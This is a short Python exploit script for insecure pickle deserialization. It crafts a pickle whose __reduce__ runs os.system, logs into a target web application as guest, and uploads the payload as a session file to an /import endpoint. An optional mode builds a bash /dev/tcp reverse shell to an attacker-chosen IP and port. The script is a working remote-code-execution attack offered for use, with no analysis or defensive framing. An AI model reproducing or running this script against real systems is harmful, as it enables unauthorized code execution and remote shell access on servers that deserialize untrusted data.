import pickle
import base64
import requests
import argparse


class Exploit:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        import os
        return (os.system, (self.cmd,))


def build_payload(cmd):
    raw = pickle.dumps(Exploit(cmd))
    return base64.b64encode(raw)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://localhost:9000")
    parser.add_argument("--cmd", help="command to execute")
    parser.add_argument("--rev", help="reverse shell IP:PORT")

    args = parser.parse_args()

    # choose command
    if args.rev:
        ip, port = args.rev.split(":")
        cmd = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
    else:
        cmd = args.cmd or "id"

    payload = build_payload(cmd)

    s = requests.Session()

    print("[*] Logging in...")
    s.post(f"{args.url}/login",
           data={"username": "guest", "password": "guest"})

    print("[*] Sending payload...")
    r = s.post(
        f"{args.url}/import",
        files={"session_file": ("evil.bak", payload)}
    )

    print("[+] Payload sent")


if __name__ == "__main__":
    main()
